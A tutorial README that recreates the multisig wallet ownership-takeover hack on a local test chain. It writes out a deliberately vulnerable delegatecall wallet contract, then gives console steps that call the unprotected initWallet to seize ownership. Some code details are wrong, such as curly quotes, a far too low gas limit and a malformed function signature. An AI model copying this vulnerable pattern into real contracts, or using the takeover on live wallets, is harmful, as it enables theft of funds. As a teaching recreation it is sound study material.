# Multi-Sig-Wallet-Attack
Simplified recreation of the multisig wallet hack.

#### This command is going to set up a new project with Truffles directory structure. 

```bash
$ truffle init
```

#### Initialise a package.json file.

```bash
$ npm init -y
```

#### This package we install is to help create transactions.

```bash
$ npm i -S ethereumjs-tx
```

#### Creating a couple files that will store our contracts in.

```bash
$ touch contracts/Wallet.sol
$ touch contracts/WalletLibrary.sol
```

#### Creating a file for our deployment script.

```bash
$ touch migrations/2_deploy_wallets.js
```

#### Wallet.sol content.

```javascript
pragma solidity ^0.4.6;

contract Wallet {
    address public owner;
    address public _walletLibrary;

    function Wallet(address libAddress, address _owner) public {
        _walletLibrary = libAddress;
        _walletLibrary.delegatecall(bytes4(keccak256("initWallet(address)")), _owner);
    }

    function withdraw(uint amount) public returns (bool success) {
        return _walletLibrary.delegatecall(bytes4(keccak256("withdraw(uint)")), amount);
    }

    function () payable {
        _walletLibrary.delegatecall(msg.data);
    }
}
```

#### WalletLibrary.sol content.

```javascript
pragma solidity ^0.4.6;

contract WalletLibrary {
    address owner;

    function initWallet(address _owner) {
        owner = _owner;
    }

    function changeOwner(address _newOwner) external {
        if (msg.sender == owner) {
            owner = _newOwner;
        }
    }

    function () payable {}

    function withdraw(uint amount) external returns (bool success) {
        if (msg.sender == owner) {
            return owner.send(amount);
        } else {
            return false;
        }
    }
}
```

#### 2_deploy_wallets.js content.

```javascript
const WalletLibrary = artifacts.require("./WalletLibrary.sol");
const Wallet = artifacts.require("./Wallet.sol");

module.exports = function(deployer, network, accounts) {
  deployer
    .deploy(WalletLibrary)
    .then(() =>
      deployer.deploy(Wallet, WalletLibrary.address, accounts[0])
    );
};
```

#### truffle.js content.

```javascript
module.exports = {
  networks: {
    development: {
      host: "127.0.0.1",
      port: 8545,
      network_id: "*",
    }
  }
};
```

#### Starting our blockchain.

```bash
$ ganache-cli -u 0 
```

#### Deploy our contracts.

```bash
$ truffle migrate
```

#### Console for our blockchain client.

```bash
$ truffle console
```

#### Deployed contract instance.

```bash
truffle(development)> Wallet.deployed().then(w => wallet = w)
```

#### Check to see who the wallet owner is.

```bash
truffle(development)> wallet.owner.call()
```

## Now we'll start our attack

#### This give us the first 4 bytes of the hashed method for the method_id.

```bash
truffle(development)> data = web3.sha3('initWallet(address)').substring(0, 10)
```

#### Then we pass the param to our function. Params and variables are expected to be 32bytes by the EVM.

```bash
truffle(development)> data += '0'.repeat(24) + web3.eth.accounts[1].substring(2)
```

#### Now we're going to create the attack transaction.

```bash
truffle(development)> txParams = { 
  to: wallet.address, 
  from: web3.eth.accounts[1],
  gasPrice: web3.toHex(30000),
  gas: web3.toHex(1000),
  data: data,
  nonce: '0x0',
}
```

#### Import the Ethereumjs-tx package.

```bash
truffle(development)> EthTxt = require('ethereumjs-tx')
```

#### Create a new transaction instance.

```bash
truffle(development)> tx = new EthTxt(txParams)
```

#### Now we'll get our privateKey to sign the attack transaction.

```bash
truffle(development)> privateKey = Buffer.from(‘PRIVATE_KEY_OF_ATTACKER_ADDRESS’, ‘hex’)
```

#### Now we'll sign the transaction with our private key.

```bash
truffle(development)> tx.sign(privateKey)
```

#### Now we'll send the transaction

```bash
truffle(development)> web3.eth.sendRawTransaction(`0x${tx.serialize().toString('hex')}`)
```

#### Lets take a look at our owner.

```bash
truffle(development)> wallet.owner.call()
```

#### Now we can see that the attacker has successfully set themselves as the owner, giving them complete control over the wallet and all of its functionality. Done!
